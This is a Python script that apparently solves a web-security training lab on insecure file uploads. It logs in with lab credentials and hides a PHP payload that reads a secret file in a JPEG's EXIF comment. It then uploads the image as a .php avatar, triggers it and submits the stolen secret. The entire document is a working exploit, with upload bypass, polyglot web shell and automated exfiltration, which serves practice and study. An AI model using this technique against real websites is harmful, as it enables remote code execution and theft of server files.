import requests
import sys
import urllib3, urllib.parse
from bs4 import BeautifulSoup
from PIL import Image
from PIL.ExifTags import TAGS
import piexif

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)
    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def insert_comment_metadata(input_file, command_str, output_file):
    img = Image.open(input_file)
    exif_dict = piexif.load(img.info.get('exif', b''))
    exif_dict["Exif"][piexif.ExifIFD.UserComment] = command_str.encode('utf-8')
    exif_bytes = piexif.dump(exif_dict)
    img.save(output_file, exif=exif_bytes)

def upload_vuln_file(s, url, path, file_upload, file_expect):
    target_url = url + path
    multipart_form_data = [
        ('avatar', file_upload),
        ('user', (None, 'wiener')),
        ('csrf', (None, get_csrf_token(s, url, '/my-account'))),
    ]
    r = s.post(target_url, files=multipart_form_data, allow_redirects=True)
    print(r.text)

    if f'The file avatars/{file_expect} has been uploaded.' in r.text and r.status_code == 200:
        print('[+] Successful uploaded vuln file')
    else:
        print('[-] Fail to upload vuln file')
        sys.exit(-1)

def download_file(s, url, path, file_name):
    target_url = url + path
    response = requests.get(target_url, stream=True)
    if response.status_code == 200:
        with open(file_name, 'wb') as f:
            f.write(response.content)
        print("[+] Download file successfully")
    else:
        print('[-] Fail to download file')
        exit(-1)

def get_user_comment_metadata(image):
    img = Image.open(image)
    exif_data = img._getexif() # type: ignore
    print(exif_data)
    if exif_data and 37510 in exif_data:
        comment = exif_data[37510].split(b'\xff')[0].decode(errors='ignore')    # jpg magic bytes start at \xff
        print('UserComment:', comment)
        return comment
    else:
        print('[-] Fail to get UserComment')
        sys.exit(-1)

def get_secret(s, url, path):
    target_url = url + path
    r = s.get(target_url)
    return r.text

def submit_sol(s, url, path, answer):
    target_url = url + path
    payload = { 'answer': answer }
    r = s.post(target_url, data=payload, headers=headers)

    if 'true' in r.text and r.status_code == 200:
        print('[+] Successful solved lab')
        sys.exit(0)
    else:
        print('[-] Fail to solve lab')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    
    input_file = 'RunamiYachiyo.jpg'
    output_file = 'out.jpg'
    vuln_file_name = 'out.php'
    vuln_file = (vuln_file_name, open(output_file, 'rb'), 'image/jpeg')
    download_file_name = 'download.jpg'

    login_acc(s, url, '/login', 'wiener', 'peter')
    insert_comment_metadata(input_file, "<?php echo file_get_contents('/home/carlos/secret'); ?>", output_file)
    upload_vuln_file(s, url, '/my-account/avatar', vuln_file, vuln_file_name)
    download_file(s, url, f"/files/avatars/{vuln_file_name}", download_file_name)
    secret = get_user_comment_metadata(download_file_name)
    submit_sol(s, url, '/submitSolution', secret)

if __name__ == '__main__':
    main()